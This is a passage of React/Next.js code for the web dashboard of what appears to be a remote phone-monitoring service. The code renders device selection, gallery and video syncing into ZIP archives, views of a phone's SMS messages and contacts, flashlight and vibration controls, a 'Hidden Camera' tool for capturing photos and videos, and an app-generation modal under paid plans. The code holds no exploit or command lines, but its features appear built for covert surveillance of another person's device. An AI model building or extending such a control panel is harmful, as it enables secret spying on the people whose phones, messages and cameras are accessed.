                                    <button onClick={selectAll} className="text-xs md:text-sm hover:text-purple-400 transition-colors whitespace-nowrap">
                                        {selectedItems.size === filteredImages.length ? 'Deselect All' : 'Select All'}
                                    </button>
                                </div>

                                <div className="flex gap-2 md:gap-3">
                                    {/* Download Button */}
                                    <button
                                        onClick={downloadSelected}
                                        disabled={isDownloading}
                                        className="flex-1 md:flex-none px-3 md:px-4 py-2 rounded-lg bg-white text-black text-xs md:text-sm font-bold hover:bg-gray-200 transition-colors flex items-center justify-center gap-2"
                                    >
                                        {isDownloading ? (
                                            <div className="w-4 h-4 border-2 border-black/30 border-t-black rounded-full animate-spin" />
                                        ) : (
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                        )}
                                        <span className="hidden sm:inline">Download Zip</span>
                                        <span className="sm:hidden">Download</span>
                                    </button>

                                    {/* Delete Button */}
                                    <button
                                        onClick={deleteSelected}
                                        disabled={isDeleting}
                                        className="flex-1 md:flex-none px-3 md:px-4 py-2 rounded-lg bg-red-500/10 text-red-500 border border-red-500/20 text-xs md:text-sm font-bold hover:bg-red-500/20 transition-colors flex items-center justify-center gap-2"
                                    >
                                        {isDeleting ? (
                                            <div className="w-4 h-4 border-2 border-red-500/30 border-t-red-500 rounded-full animate-spin" />
                                        ) : (
                                            <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
                                        )}
                                        Delete
                                    </button>

                                    <button onClick={() => { setSelectedItems(new Set()); setIsSelectionMode(false); }} className="p-2 hover:bg-white/10 rounded-lg transition-colors">
                                        <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                    </button>
                                </div>
                            </div>
                        )}

                        {/* Content based on active tab */}
                        {activeTab === 'zip' ? (
                            /* ZIP Tab Content */
                            <div>
                                {zipFiles.length > 0 ? (
                                    <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                                        {zipFiles.map((zip, idx) => (
                                            <a
                                                key={idx}
                                                href={zip.url}
                                                target="_blank"
                                                className="block p-4 rounded-2xl bg-white/5 border border-white/10 hover:border-purple-500/50 hover:bg-white/10 transition-all group"
                                            >
                                                <div className="flex items-center gap-4">
                                                    <div className="w-14 h-14 rounded-xl bg-gradient-to-br from-purple-500/30 to-blue-500/30 flex items-center justify-center text-2xl group-hover:scale-110 transition-transform">
                                                        📦
                                                    </div>
                                                    <div className="flex-1">
                                                        <div className="font-semibold text-white group-hover:text-purple-400 transition-colors">{zip.folderName}.zip</div>
                                                        <div className="text-xs text-white/50">{zip.fileCount} files • {new Date(zip.timestamp).toLocaleTimeString()}</div>
                                                    </div>
                                                    <svg className="w-5 h-5 text-white/30 group-hover:text-purple-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4" />
                                                    </svg>
                                                </div>
                                            </a>
                                        ))}
                                    </div>
                                ) : (
                                    <div className="flex flex-col items-center justify-center py-20 text-white/40">
                                        <div className="w-24 h-24 rounded-3xl bg-gradient-to-br from-purple-500/20 to-blue-500/20 flex items-center justify-center mb-6 text-5xl">
                                            📦
                                        </div>
                                        <p className="text-lg font-medium mb-2">No ZIP downloads yet</p>
                                        <p className="text-sm text-white/30 text-center max-w-sm">When you download folders as ZIP from your device, they will appear here for easy access</p>
                                    </div>
                                )}
                            </div>
                        ) : (
                            /* Images/Videos Grid */
                            <>
                                {filteredImages.length === 0 ? (
                                    <div className="flex flex-col items-center justify-center py-20 text-white/40">
                                        <div className="w-20 h-20 rounded-2xl bg-white/5 flex items-center justify-center mb-4">
                                            <svg className="w-10 h-10" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                        </div>
                                        <p>No media found.</p>
                                    </div>
                                ) : (
                                    <div className="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
                                        {filteredImages.map((img) => (
                                            <div
                                                key={img.id}
                                                className={`group relative aspect-square rounded-2xl overflow-hidden bg-white/5 border transition-all duration-300 ${selectedItems.has(img.id) ? 'border-purple-500 ring-2 ring-purple-500/50' : 'border-white/10 hover:border-white/30'}`}
                                            >
                                                {img.resource_type === 'video' ? (
                                                    <video src={img.url} className="w-full h-full object-cover" muted loop />
                                                ) : (
                                                    <Image src={img.url} alt="Gallery Image" fill className="object-cover transition-transform duration-500 group-hover:scale-110" />
                                                )}

                                                {/* Click Area for Preview - LOWEST z-index */}
                                                <div
                                                    className="absolute inset-0 cursor-pointer z-0"
                                                    onClick={() => setPreviewItem(img)}
                                                />

                                                {/* Video Play Icon - MIDDLE z-index */}
                                                {img.resource_type === 'video' && (
                                                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-16 h-16 rounded-full bg-black/50 backdrop-blur-md flex items-center justify-center pointer-events-none border-2 border-white/30 z-5">
                                                        <svg className="w-8 h-8 text-white ml-1" fill="currentColor" viewBox="0 0 24 24"><path d="M8 5v14l11-7z" /></svg>
                                                    </div>
                                                )}

                                                {/* Selection Checkbox - HIGHEST z-index */}
                                                <div className="absolute top-3 right-3 z-20">
                                                    <button
                                                        onClick={(e) => {
                                                            e.stopPropagation();
                                                            e.preventDefault();
                                                            toggleSelection(img.id);
                                                        }}
                                                        className={`w-8 h-8 rounded-full border-2 flex items-center justify-center transition-all shadow-lg ${selectedItems.has(img.id) ? 'bg-purple-500 border-purple-500 scale-110' : 'bg-black/40 backdrop-blur-sm border-white/70 hover:border-white hover:bg-black/60 hover:scale-110'}`}
                                                    >
                                                        {selectedItems.has(img.id) && <svg className="w-4 h-4 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path></svg>}
                                                    </button>
                                                </div>
                                            </div>
                                        ))}
                                    </div>
                                )}
                            </>
                        )}

                        {/* Preview Modal */}
                        {previewItem && (
                            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/95 backdrop-blur-xl animate-fadeIn">
                                <button
                                    onClick={() => setPreviewItem(null)}
                                    className="absolute top-6 right-6 p-2 rounded-full bg-white/10 hover:bg-white/20 transition-colors z-50"
                                >
                                    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                </button>

                                <div className="relative w-full h-full max-w-6xl max-h-[90vh] p-4 flex flex-col items-center justify-center">
                                    {previewItem.resource_type === 'video' ? (
                                        <video
                                            src={previewItem.url}
                                            controls
                                            autoPlay
                                            className="max-w-full max-h-[80vh] rounded-lg shadow-2xl"
                                        />
                                    ) : (
                                        <div className="relative w-full h-[80vh]">
                                            <Image
                                                src={previewItem.url}
                                                alt="Preview"
                                                fill
                                                className="object-contain"
                                            />
                                        </div>
                                    )}

                                    <div className="mt-6 flex gap-4">
                                        <button
                                            onClick={() => downloadSingle(previewItem.url, `download.${previewItem.resource_type === 'video' ? 'mp4' : 'jpg'}`)}
                                            className="px-6 py-3 rounded-full bg-white text-black font-bold hover:scale-105 transition-transform flex items-center gap-2"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path></svg>
                                            Download
                                        </button>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* SMS Detail Modal */}
                        {selectedSms && (
                            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                                <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-lg w-full mx-4 animate-scaleIn">
                                    <div className="flex justify-between items-start mb-4">
                                        <div>
                                            <h3 className="text-lg font-bold">{selectedSms.address}</h3>
                                            <p className="text-xs text-white/40">
                                                {new Date(selectedSms.date).toLocaleDateString()} at {new Date(selectedSms.date).toLocaleTimeString()}
                                            </p>
                                        </div>
                                        <button
                                            onClick={() => setSelectedSms(null)}
                                            className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                        >
                                            <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                        </button>
                                    </div>
                                    <div className="p-4 rounded-xl bg-white/5 border border-white/10 mb-4">
                                        <p className="text-sm whitespace-pre-wrap">{selectedSms.body}</p>
                                    </div>
                                    <div className="flex gap-2">
                                        <span className={`text-xs px-3 py-1 rounded-full ${selectedSms.type === 1 ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'}`}>
                                            {selectedSms.type === 1 ? '📥 Received' : '📤 Sent'}
                                        </span>
                                        <span className={`text-xs px-3 py-1 rounded-full ${selectedSms.read ? 'bg-white/10 text-white/60' : 'bg-yellow-500/20 text-yellow-400'}`}>
                                            {selectedSms.read ? 'Read' : 'Unread'}
                                        </span>
                                    </div>
                                </div>
                            </div>
                        )}

                        {/* Upload Options Modal */}
                        {selectedFolder && (
                            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm animate-fadeIn">
                                <div className="bg-[#1a1a1a] border border-white/20 p-6 rounded-2xl shadow-2xl max-w-sm w-full animate-scaleIn">
                                    <h3 className="text-xl font-bold mb-1">Sync "{selectedFolder.name}"</h3>

                                    {!syncMediaType ? (
                                        <>
                                            <p className="text-white/40 text-sm mb-6">What would you like to sync?</p>
                                            <div className="grid grid-cols-2 gap-3 mb-6">
                                                <button onClick={() => setSyncMediaType('image')} className="p-4 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition-all flex flex-col items-center gap-2 group">
                                                    <div className="p-3 rounded-full bg-purple-500/20 text-purple-400 group-hover:scale-110 transition-transform">
                                                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                                    </div>
                                                    <span className="font-medium">Images</span>
                                                </button>
                                                <button onClick={() => setSyncMediaType('video')} className="p-4 rounded-xl bg-white/5 hover:bg-white/10 border border-white/10 transition-all flex flex-col items-center gap-2 group">
                                                    <div className="p-3 rounded-full bg-blue-500/20 text-blue-400 group-hover:scale-110 transition-transform">
                                                        <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
                                                    </div>
                                                    <span className="font-medium">Videos</span>
                                                </button>
                                            </div>
                                        </>
                                    ) : (
                                        <>
                                            <p className="text-white/40 text-sm mb-6">How many {syncMediaType}s?</p>
                                            <div className="grid grid-cols-2 gap-3 mb-6">
                                                {userPlan === 'basic' ? (
                                                    <>
                                                        <button onClick={() => triggerUpload(10)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">10 items</button>
                                                        <button onClick={() => triggerUpload(20)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">20 items</button>
                                                        <button onClick={() => triggerUpload(50)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">50 items</button>
                                                    </>
                                                ) : (
                                                    <>
                                                        <button onClick={() => triggerUpload(50)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">50 items</button>
                                                        <button onClick={() => triggerUpload(100)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">100 items</button>
                                                        <button onClick={() => triggerUpload(200)} className="p-3 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 transition-colors">200 items</button>
                                                    </>
                                                )}
                                                <button onClick={() => {
                                                    // Show ZIP vs One-by-One options
                                                    setSyncOptionsFolder({
                                                        name: selectedFolder?.name || '',
                                                        count: selectedFolder?.count || 0,
                                                        type: syncMediaType === 'video' ? 'video' : 'image'
                                                    });
                                                    setShowSyncOptionsModal(true);
                                                    setSelectedFolder(null);
                                                    setSyncMediaType(null);
                                                }} className="p-3 rounded-lg bg-gradient-to-r from-purple-600 to-blue-600 font-bold">All items</button>
                                            </div>
                                        </>
                                    )}

                                    <button onClick={() => { setSelectedFolder(null); setSyncMediaType(null); }} className="w-full py-2 text-sm text-white/40 hover:text-white transition-colors">Cancel</button>
                                </div>
                            </div>
                        )}
                    </>
                )}

                {/* WhatsApp Button - Only show when no items are selected */}
                {selectedItems.size === 0 && <WhatsAppButton />}

                {/* Device Selection Modal */}
                {isDeviceDropdownOpen && (
                    <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border-t md:border border-white/20 w-full md:w-96 md:rounded-2xl shadow-2xl animate-slideUp">
                            <div className="p-4 border-b border-white/10 flex justify-between items-center">
                                <div>
                                    <h3 className="text-lg font-bold">Select Device</h3>
                                    <p className="text-xs text-white/40">Limit: {planLimits.maxDevices} device{planLimits.maxDevices > 1 ? 's' : ''}</p>
                                </div>
                                <button
                                    onClick={() => setIsDeviceDropdownOpen(false)}
                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                </button>
                            </div>
                            <div className="max-h-[60vh] overflow-y-auto p-2">
                                {devices.filter(d => d.online).length > 0 ? (
                                    devices.filter(d => d.online).map((device, idx) => {
                                        const isLocked = idx >= planLimits.maxDevices;
                                        return (
                                            <button
                                                key={device.deviceId}
                                                onClick={() => {
                                                    if (isLocked) {
                                                        setShowPlansModal(true);
                                                        setIsDeviceDropdownOpen(false);
                                                    } else {
                                                        setSelectedDeviceId(device.deviceId);
                                                        setIsDeviceDropdownOpen(false);
                                                    }
                                                }}
                                                className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${isLocked
                                                    ? 'bg-white/5 border border-white/10 opacity-60'
                                                    : selectedDeviceId === device.deviceId
                                                        ? 'bg-purple-500/20 border border-purple-500/50'
                                                        : 'bg-white/5 border border-transparent hover:bg-white/10'
                                                    }`}
                                            >
                                                <div className="flex items-center gap-3">
                                                    <div className={`w-3 h-3 rounded-full ${isLocked ? 'bg-red-500' : 'bg-green-500'}`} />
                                                    <div>
                                                        <div className="font-medium flex items-center gap-2">
                                                            {device.name}
                                                            {isLocked && (
                                                                <span className="text-xs px-2 py-0.5 rounded bg-red-500/20 text-red-400">🔒 Locked</span>
                                                            )}
                                                        </div>
                                                        <div className={`text-xs ${isLocked ? 'text-red-400' : 'text-green-400'}`}>
                                                            {isLocked ? 'Upgrade to unlock' : 'Online'}
                                                        </div>
                                                    </div>
                                                </div>
                                                {!isLocked && selectedDeviceId === device.deviceId && (
                                                    <svg className="w-5 h-5 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                                )}
                                                {isLocked && (
                                                    <svg className="w-5 h-5 text-yellow-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path></svg>
                                                )}
                                            </button>
                                        );
                                    })
                                ) : (
                                    <div className="text-center py-8 text-white/40">
                                        <svg className="w-12 h-12 mx-auto mb-3 opacity-50" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                        <p>No devices online</p>
                                        <p className="text-xs mt-1">Open the app on your phone</p>
                                    </div>
                                )}
                            </div>
                        </div>
                    </div>
                )}

                {/* Tools Selection Modal */}
                {isToolDropdownOpen && (
                    <div className="fixed inset-0 z-50 flex items-end md:items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border-t md:border border-white/20 w-full md:w-96 md:rounded-2xl shadow-2xl animate-slideUp">
                            <div className="p-4 border-b border-white/10 flex justify-between items-center">
                                <h3 className="text-lg font-bold">Select Tool</h3>
                                <button
                                    onClick={() => setIsToolDropdownOpen(false)}
                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                </button>
                            </div>
                            <div className="p-2">
                                <button
                                    onClick={() => {
                                        setSelectedTool('gallery');
                                        setIsToolDropdownOpen(false);
                                    }}
                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'gallery' ? 'bg-purple-500/20 border border-purple-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-purple-500/20">
                                            <svg className="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
                                        </div>
                                        <div>
                                            <div className="font-medium">Gallery</div>
                                            <div className="text-xs text-white/40">View photos & videos</div>
                                        </div>
                                    </div>
                                    {selectedTool === 'gallery' && (
                                        <svg className="w-5 h-5 text-purple-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                    )}
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedTool('sms');
                                        setIsToolDropdownOpen(false);
                                    }}
                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'sms' ? 'bg-blue-500/20 border border-blue-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-blue-500/20">
                                            <svg className="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 5v-5z"></path></svg>
                                        </div>
                                        <div>
                                            <div className="font-medium">SMS</div>
                                            <div className="text-xs text-white/40">View text messages</div>
                                        </div>
                                    </div>
                                    {selectedTool === 'sms' && (
                                        <svg className="w-5 h-5 text-blue-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                    )}
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedTool('contacts');
                                        setIsToolDropdownOpen(false);
                                    }}
                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'contacts' ? 'bg-green-500/20 border border-green-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-green-500/20">
                                            <svg className="w-5 h-5 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                                        </div>
                                        <div>
                                            <div className="font-medium">Contacts</div>
                                            <div className="text-xs text-white/40">View contact list</div>
                                        </div>
                                    </div>
                                    {selectedTool === 'contacts' && (
                                        <svg className="w-5 h-5 text-green-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                    )}
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedTool('torch');
                                        setIsToolDropdownOpen(false);
                                    }}
                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'torch' ? 'bg-yellow-500/20 border border-yellow-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-yellow-500/20">
                                            <svg className="w-5 h-5 text-yellow-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 10V3L4 14h7v7l9-11h-7z"></path></svg>
                                        </div>
                                        <div>
                                            <div className="font-medium">Flashlight</div>
                                            <div className="text-xs text-white/40">Toggle flashlight</div>
                                        </div>
                                    </div>
                                    {selectedTool === 'torch' && (
                                        <svg className="w-5 h-5 text-yellow-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                    )}
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedTool('vibration');
                                        setIsToolDropdownOpen(false);
                                    }}
                                    className={`w-full text-left px-4 py-4 rounded-xl mb-2 flex items-center justify-between transition-colors ${selectedTool === 'vibration' ? 'bg-orange-500/20 border border-orange-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-orange-500/20">
                                            <svg className="w-5 h-5 text-orange-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                                        </div>
                                        <div>
                                            <div className="font-medium">Vibration</div>
                                            <div className="text-xs text-white/40">Vibrate device</div>
                                        </div>
                                    </div>
                                    {selectedTool === 'vibration' && (
                                        <svg className="w-5 h-5 text-orange-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                    )}
                                </button>
                                <button
                                    onClick={() => {
                                        setSelectedTool('camera');
                                        setIsToolDropdownOpen(false);
                                    }}
                                    className={`w-full text-left px-4 py-4 rounded-xl flex items-center justify-between transition-colors ${selectedTool === 'camera' ? 'bg-pink-500/20 border border-pink-500/50' : 'bg-white/5 border border-transparent hover:bg-white/10'}`}
                                >
                                    <div className="flex items-center gap-3">
                                        <div className="p-2 rounded-lg bg-pink-500/20">
                                            <svg className="w-5 h-5 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                        </div>
                                        <div>
                                            <div className="font-medium">Hidden Camera</div>
                                            <div className="text-xs text-white/40">Capture photos & videos</div>
                                        </div>
                                    </div>
                                    {selectedTool === 'camera' && (
                                        <svg className="w-5 h-5 text-pink-400" fill="currentColor" viewBox="0 0 20 20"><path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd"></path></svg>
                                    )}
                                </button>
                            </div>
                        </div>
                    </div>
                )}

                {showAppModal && (
                    <AppGenerationModal
                        isOpen={showAppModal}
                        onClose={() => setShowAppModal(false)}
                        uuid={session?.user?.uuid || ''}
                        socket={socket}
                        userPlan={userPlan}
                        onUpgrade={() => setShowPlansModal(true)}
                    />
                )}

                {/* Settings Modal */}
                {isSettingsOpen && (
                    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-sm animate-fadeIn">
                        <div className="bg-[#1a1a1a] border border-white/20 w-full max-w-md rounded-2xl shadow-2xl animate-slideUp mx-4">
                            <div className="p-4 border-b border-white/10 flex justify-between items-center">
                                <h3 className="text-lg font-bold flex items-center gap-2">
                                    <svg className="w-5 h-5 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"></path><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"></path></svg>
                                    Settings
                                </h3>
                                <button
                                    onClick={() => setIsSettingsOpen(false)}
                                    className="p-2 hover:bg-white/10 rounded-lg transition-colors"
                                >
                                    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path></svg>
                                </button>
                            </div>

                            <div className="p-4 space-y-4">
                                {/* Permission Check Section */}
                                <div className="bg-white/5 rounded-xl p-4 border border-white/10">
                                    <h4 className="text-sm font-semibold mb-3 flex items-center gap-2">
                                        <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"></path></svg>
                                        Permission Status
                                    </h4>

                                    {selectedDeviceId ? (
                                        <>
                                            <button
                                                onClick={checkPermissions}
                                                disabled={isCheckingPermissions}
